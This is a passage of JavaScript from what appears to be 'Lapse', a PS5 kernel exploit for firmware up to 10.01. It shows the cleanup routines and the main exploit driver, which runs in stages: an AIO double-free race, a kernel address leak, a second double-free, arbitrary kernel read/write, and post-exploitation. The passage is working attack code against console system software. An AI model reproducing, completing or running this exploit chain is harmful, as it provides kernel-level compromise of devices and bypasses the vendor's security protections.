                    for (let i = 0; i < sds.length; i++) {
                        if (sds[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds[i]);
                            sds[i] = -1n;
                        }
                    }
                    sds = null;
                }

                if (sds_alt !== null) {
                    for (let i = 0; i < sds_alt.length; i++) {
                        if (sds_alt[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds_alt[i]);
                        }
                    }
                    sds_alt = null;
                }
                
                if (prev_core >= 0) {
                    logger.log("Restoring to previous core: " + prev_core);
                    logger.flush();
                    pin_to_core(prev_core);
                    prev_core = -1;
                }
                
                set_rtprio(prev_rtprio);

                logger.log("Cleanup completed");
                logger.flush();

            } catch (e) {
                logger.log("Error during cleanup: " + e.message);
                logger.flush();
            }
        }
        
        function cleanup_fail() {
            cleanup();
            
            if (is_jailbroken()) {
                write_file("/user/temp/common_temp/lapse.fail", "");
            } else {
                write_file(failcheck_path, "");
            }
            
            logger.log("Exploit failed - Reboot and try again");
            logger.flush();
            send_notification("Exploit failed - Reboot and try again");
        }
        
        function rerun_check() {
            return file_exists(failcheck_path) || file_exists("/user/temp/common_temp/lapse.fail");
        }
        
        ////////////////////
        // MAIN EXECUTION //
        ////////////////////
/*
        try {
            if(is_jailbroken()) {
                logger.log("Already Jailbroken");
                send_notification("Already Jailbroken");
                return;
            }
        } catch (e) {
            logger.log("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            send_notification("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            return;
        }

        if(rerun_check()) {
            logger.log("Restart your PS5 to run Lapse again");
            send_notification("Restart your PS5 to run Lapse again");
            return;
        }
*/
        logger.log(lapse_version);
        logger.flush();
        send_notification(lapse_version);
        
        FW_VERSION = get_fwversion();

        logger.log("Detected firmware : " + FW_VERSION);
        logger.flush();

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        if (compare_version(FW_VERSION, "10.01") > 0) {
            logger.log("Not suppoerted firmware\nAborting...");
            logger.flush();
            send_notification("Not suppoerted firmware\nAborting...");
            return;
        }
        
        kernel_offset = get_kernel_offset(FW_VERSION);
        
        logger.log("\n=== STAGE 0: Setup ===");
        logger.flush();
        const setup_success = setup();
        if (!setup_success) {
            logger.log("Setup failed");
            logger.flush();
            return;
        }
        
        logger.log("Setup completed");
        logger.flush();
            
        try {
            logger.log("\n=== STAGE 1: Double-free AIO ===");
            sd_pair = double_free_reqs2();
            if (sd_pair === null) {
                logger.log("Stage 1 race condition failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            logger.log("Stage 1 completed");
            logger.flush();
           
            logger.log("\n=== STAGE 2: Leak kernel addresses ===");
            logger.flush();
            leak_result = leak_kernel_addrs(sd_pair, sds);
            if (leak_result === null) {
                logger.log("Stage 2 kernel address leak failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            logger.log("Stage 2 completed");
            logger.flush();
            logger.log("Leaked addresses:");
            logger.flush();
            logger.log("  reqs1_addr: " + hex(leak_result.reqs1_addr));
            logger.flush();
            logger.log("  kbuf_addr: " + hex(leak_result.kbuf_addr));
            logger.flush();
            logger.log("  kernel_addr: " + hex(leak_result.kernel_addr));
            logger.flush();
            logger.log("  target_id: " + hex(BigInt(leak_result.target_id)));
            logger.flush();
            logger.log("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
            logger.flush();
            logger.log("  aio_info_addr: " + hex(leak_result.aio_info_addr));
            logger.flush();
            logger.log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
            logger.flush();
            const pktopts_sds = double_free_reqs1(
                leak_result.reqs1_addr,
                leak_result.target_id,
                leak_result.evf,
                sd_pair[0],
                sds,
                sds_alt,
                leak_result.fake_reqs3_addr
            );
            
            syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));
    
            if (pktopts_sds === null) {
                logger.log("Stage 3 double free SceKernelAioRWRequest failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            
            logger.log("Stage 3 completed!");
            logger.flush();
            logger.log("Aliased socket pair: " + pktopts_sds[0] + ", " + pktopts_sds[1]);
            logger.flush();

            logger.log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
            logger.flush();

            arw_result = make_kernel_arw(
                pktopts_sds,
                leak_result.reqs1_addr,
                leak_result.kernel_addr,
                sds,
                sds_alt,
                leak_result.aio_info_addr
            );
            
            if (arw_result === null) {
                logger.log("Stage 4 get arbitrary kernel read/write failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            
            logger.log("Stage 4 completed!");
            logger.flush();
            
            logger.log("\n=== STAGE 5: PS5 post-exploitation ===");
            logger.flush();
            
            try {
                post_exploitation_ps5();
                logger.log("Stage 5 completed!");
                logger.flush();
            } catch (e) {
                logger.log("Stage 5 post-exploitation failed");
                logger.flush();
                throw e;
            }
            
            cleanup();
            
            logger.log("Lapse finished");
            logger.flush();
            send_notification("Lapse finished");
            
        } catch (e) {
            logger.log("Lapse error: " + e.message);
            logger.log(e.stack);
            logger.flush();
            
            cleanup_fail();
        }
    
    } catch (e) {
        logger.log("Lapse error: " + e.message);
        logger.log(e.stack);
        logger.flush();
    }

})();
